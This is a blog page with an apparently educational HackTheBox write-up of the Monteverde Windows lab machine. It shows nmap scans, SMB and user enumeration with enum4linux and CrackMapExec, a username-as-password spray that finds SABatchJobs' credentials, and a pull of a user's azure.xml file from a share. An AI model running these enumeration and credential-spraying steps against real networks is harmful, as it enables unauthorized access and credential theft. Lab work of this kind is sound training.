<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Monteverde | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,medium"><meta name=description content="Monteverde HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/monteverde/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/monteverde/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Monteverde "><meta property="og:description" content="Monteverde HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/monteverde/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png"><meta name=twitter:title content="Monteverde "><meta name=twitter:description content="Monteverde HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Monteverde ","item":"https://s4ch.github.io/writeups/hackthebox/monteverde/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Monteverde ","name":"Monteverde ","description":"Monteverde HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","medium"],"articleBody":"≡ƒÆó Info Name: Monteverde Profile: www.hackthebox.eu Difficulty: Medium OS: Windows Points: 30 Overview Network enumeration: SMB enumeration Network reconnaissance: SMB share \u0026 Azure AD Connect config \u0026 credential stuffing Privilege Escalation : mhope to Administrator: hidden folder \u0026 Azure AD Connect credentials decryption Install tools used on BlackArch Linux:\n$ sudo pacman -S nmap crackmapexec enum4linux impacket evil-winrm Network enumeration I ran a nmap port scan to discover open ports:\n$ sudo nmap -p- 10.10.10.172 -oA nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET Nmap scan report for 10.10.10.172 Host is up (0.031s latency). Not shown: 65516 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49703/tcp open unknown 49775/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 123.83 seconds And then did a service discovery and script scan with nmap again on open ports.\n$ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining) Nmap scan report for 10.10.10.172 Host is up (0.031s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49675/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 49775/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r SF:(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver SF:sion\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -48m05s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-25T20:22:50 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 275.27 seconds Let’s see what we can find through SMB with CrackMapExec, enum4linux and GetNPUsers.py from impacket.\n$ cme smb 10.10.10.172 SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False) $ enum4linux -a 10.10.10.172 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 25 22:30:29 2020 ========================== | Target Information | ========================== Target ........... 10.10.10.172 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.172 | ==================================================== [E] Can't find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.172 | ============================================ Looking up status of 10.10.10.172 No reply from 10.10.10.172 ===================================== | Session Check on 10.10.10.172 | ===================================== [+] Server 10.10.10.172 allows sessions using username '', password '' [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.172 | =========================================== Unable to initialize messaging context Domain Name: MEGABANK Domain Sid: S-1-5-21-391775091-850290835-3566037492 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.172 | ====================================== [+] Got OS info for 10.10.10.172 from smbclient: [+] Got OS info for 10.10.10.172 from srvinfo: Unable to initialize messaging context Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.172 | ============================= index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope Name: Mike Hope Desc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary Name: Ray O'Leary Desc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs Name: SABatchJobs Desc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan Name: Sally Morgan Desc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata Name: svc-ata Desc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec Name: svc-bexec Desc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp Desc: (null) user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] ========================================= | Share Enumeration on 10.10.10.172 | ========================================= Unable to initialize messaging context do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. Unable to connect with SMB1 -- no workgroup available [+] Attempting to map shares on 10.10.10.172 ==================================================== | Password Policy Information for 10.10.10.172 | ==================================================== [E] Unexpected error from polenum: [+] Attaching to 10.10.10.172 using a NULL share [+] Trying protocol 139/SMB... [!] Protocol failed: Cannot request session (Called Name:10.10.10.172) [+] Trying protocol 445/SMB... [!] Protocol failed: Missing required parameter 'digestmod'. [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 7 ============================== | Groups on 10.10.10.172 | ============================== [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[Storage Replica Administrators] rid:[0x246] [+] Getting builtin group memberships: Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs Group 'Users' (RID: 545) has member: Couldn't lookup SIDs Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f] group:[ADSyncAdmins] rid:[0x451] group:[ADSyncOperators] rid:[0x452] group:[ADSyncBrowse] rid:[0x453] group:[ADSyncPasswordSet] rid:[0x454] [+] Getting local group memberships: Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[DnsUpdateProxy] rid:[0x44e] group:[Azure Admins] rid:[0xa29] group:[File Server Admins] rid:[0xa2e] group:[Call Recording Admins] rid:[0xa2f] group:[Reception] rid:[0xa30] group:[Operations] rid:[0xa31] group:[Trading] rid:[0xa32] group:[HelpDesk] rid:[0xa33] group:[Developers] rid:[0xa34] [+] Getting domain group memberships: Group 'Operations' (RID: 2609) has member: MEGABANK\\smorgan Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\\Administrator Group 'Domain Guests' (RID: 514) has member: MEGABANK\\Guest Group 'Domain Users' (RID: 513) has member: MEGABANK\\Administrator Group 'Domain Users' (RID: 513) has member: MEGABANK\\krbtgt Group 'Domain Users' (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 Group 'Domain Users' (RID: 513) has member: MEGABANK\\mhope Group 'Domain Users' (RID: 513) has member: MEGABANK\\SABatchJobs Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-ata Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-bexec Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-netapp Group 'Domain Users' (RID: 513) has member: MEGABANK\\dgalanos Group 'Domain Users' (RID: 513) has member: MEGABANK\\roleary Group 'Domain Users' (RID: 513) has member: MEGABANK\\smorgan Group 'Trading' (RID: 2610) has member: MEGABANK\\dgalanos Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\Administrator Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\mhope Group 'HelpDesk' (RID: 2611) has member: MEGABANK\\roleary ======================================================================= | Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn't get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.172 | ============================================= Unable to initialize messaging context Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Wed Mar 25 22:31:39 2020 $ GetNPUsers.py -no-pass -dc-ip 10.10.10.172 MEGABANK/smorgan -\u003e nothing Thanks to enum4linux, we now have all users and groups information we need.\nLet’s try a quick bruteforce where user = password with CrackMapExec.\n$ cme smb 10.10.10.172 -u users.txt -p users.txt ... SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK\\SABatchJobs:SABatchJobs Network reconnaissance We found the password SABatchJobs use the username as password. Let’s use this account for enumerating some shares:\n$ cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False) SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK\\SABatchJobs:SABatchJobs SMB 10.10.10.172 445 MONTEVERDE [+] Enumerated shares SMB 10.10.10.172 445 MONTEVERDE Share Permissions Remark SMB 10.10.10.172 445 MONTEVERDE ----- ----------- ------ SMB 10.10.10.172 445 MONTEVERDE ADMIN$ Remote Admin SMB 10.10.10.172 445 MONTEVERDE azure_uploads READ SMB 10.10.10.172 445 MONTEVERDE C$ Default share SMB 10.10.10.172 445 MONTEVERDE E$ Default share SMB 10.10.10.172 445 MONTEVERDE IPC$ READ Remote IPC SMB 10.10.10.172 445 MONTEVERDE NETLOGON READ Logon server share SMB 10.10.10.172 445 MONTEVERDE SYSVOL READ Logon server share SMB 10.10.10.172 445 MONTEVERDE users$ READ Let’s find is there are valuable files in users$ share.\n$ smbclient '\\\\10.10.10.172\\users$' -U 'SABatchJobs' Unable to initialize messaging context Enter WORKGROUP\\SABatchJobs's password: Try \"help\" to get a list of possible commands. smb: \\\u003e recuse on recuse: command not found smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * getting file \\mhope\\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec) Let’s read /mhope/azure.xml:\n","wordCount":"1946","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png","datePublished":"2020-06-11T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/monteverde/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Monteverde</h1><div class=post-description>Monteverde HackTheBox writeup</div><div class=post-meta><span title='2020-06-11 00:00:00 +0000 UTC'>June 11, 2020</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;1946 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png alt="Monteverde HackTheBox Machine"><p>Monteverde - Medium Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#network-reconnaissance>Network reconnaissance</a></li><li><a href=#privilege-escalation--mhope-to-administrator>Privilege Escalation : mhope to Administrator</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Monteverde</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/223>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 30</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network enumeration</strong>: SMB enumeration</li><li><strong>Network reconnaissance</strong>: SMB share & Azure AD Connect config & credential stuffing</li><li><strong>Privilege Escalation : mhope to Administrator</strong>: hidden folder & Azure AD Connect credentials decryption</li></ul><p>Install tools used on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap crackmapexec enum4linux impacket evil-winrm
</code></pre><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>I ran a <a href=https://nmap.org/>nmap</a> port scan to discover open ports:</p><pre tabindex=0><code>$ sudo nmap -p- 10.10.10.172 -oA nmap_ports
[sudo] password for cyfun:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET
Nmap scan report for 10.10.10.172
Host is up (0.031s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49703/tcp open  unknown
49775/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 123.83 seconds
</code></pre><p>And then did a service discovery and script scan with <a href=https://nmap.org/>nmap</a> again on open
ports.</p><pre tabindex=0><code>$ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services
[sudo] password for cyfun:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET
Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining)
Nmap scan report for 10.10.10.172
Host is up (0.031s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r
SF:(DNSVersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
SF:sion\x04bind\0\0\x10\0\x03&#34;);
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -48m05s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-03-25T20:22:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 275.27 seconds
</code></pre><p>Let&rsquo;s see what we can find through SMB with <a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>, <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a>
and <code>GetNPUsers.py</code> from impacket.</p><pre tabindex=0><code>$ cme smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)

$ enum4linux -a 10.10.10.172
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 25 22:30:29 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... &#39;&#39;
Password ......... &#39;&#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ====================================================
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ====================================================
[E] Can&#39;t find workgroup/domain

 ============================================
|    Nbtstat Information for 10.10.10.172    |
 ============================================
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 =====================================
|    Session Check on 10.10.10.172    |
 =====================================
[+] Server 10.10.10.172 allows sessions using username &#39;&#39;, password &#39;&#39;
[+] Got domain/workgroup name:

 ===========================================
|    Getting domain SID for 10.10.10.172    |
 ===========================================
Unable to initialize messaging context
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ======================================
|    OS information on 10.10.10.172    |
 ======================================
[+] Got OS info for 10.10.10.172 from smbclient:
[+] Got OS info for 10.10.10.172 from srvinfo:
Unable to initialize messaging context
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =============================
|    Users on 10.10.10.172    |
 =============================
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O&#39;Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =========================================
|    Share Enumeration on 10.10.10.172    |
 =========================================
Unable to initialize messaging context
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ====================================================
|    Password Policy Information for 10.10.10.172    |
 ====================================================
[E] Unexpected error from polenum:

[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: Missing required parameter &#39;digestmod&#39;.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7

 ==============================
|    Groups on 10.10.10.172    |
 ==============================

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
